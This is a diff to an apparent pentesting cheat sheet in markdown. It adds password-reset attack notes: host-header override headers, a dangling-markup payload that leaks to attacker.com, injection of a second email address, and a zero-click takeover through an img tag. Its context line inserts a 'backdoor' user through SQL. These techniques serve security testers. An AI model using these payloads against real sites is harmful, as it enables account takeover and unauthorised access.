@@ -257,10 +257,16 @@ insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 
 **Password reset**
 - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
-- Try with headers like `X-Forwarded-Host:`
+- Try with different headers
+  ```
+  X-Forwarded-Host:
+  X-Original-Url:
+  X-Host:
+  Host:
+  ```
 - Via dangling markup
   - `Host: victim.com:'<a href="//attacker.com/?`
-- Insert two emails, like:
+- Insert two emails, for example:
   - `email1@service.com;email2@service.com`
   - `email:["email1@service.com","email2@service.com"]`
 - If you can control the body of the password reset email, embed the password reset link within an `<img>` tag using a subdomain you control. This may allow for a zero-click account takeover via Googlebot's automatic link crawling
